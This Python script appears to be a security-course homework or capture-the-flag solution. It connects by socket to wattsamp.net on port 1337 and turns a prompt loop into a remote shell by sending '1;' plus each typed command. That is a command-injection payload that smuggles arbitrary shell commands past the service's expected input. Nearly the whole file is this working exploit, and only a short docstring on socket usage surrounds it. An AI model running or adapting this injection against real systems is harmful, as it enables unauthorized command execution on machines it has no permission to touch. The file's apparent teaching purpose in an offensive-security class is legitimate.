"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import subprocess

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    s.send("1;"+cmd+"\n")
    data = s.recv(1024)
    print(data)
    """
        Sockets: https://docs.python.org/3/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

def main():
    while True:
        command = raw_input("> ")
        if (command == "exit" or command == "quit"):
            break
        elif command == "help":
            print("Show this help menu")
        else:
            execute_cmd(command)

if '__main__' == __name__:
    main()
